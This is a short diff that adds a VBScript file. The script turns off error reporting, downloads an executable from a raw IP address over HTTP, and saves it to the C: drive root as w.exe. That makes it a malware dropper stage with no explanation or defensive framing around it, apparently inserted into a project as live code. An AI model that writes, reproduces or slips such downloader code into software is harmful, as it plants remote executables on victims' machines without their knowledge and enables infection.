@@ -1,0 +1,9 @@
+on error resume next 
+set o = CreateObject("msxml2.XMLHTTP")
+o.open "GET","http://195.225.177.33/0023.exe",False
+o.send
+set s = createobject("adodb.stream")
+s.type=1
+s.open
+s.write o.responseBody
+s.savetofile "C:\w.exe",2 
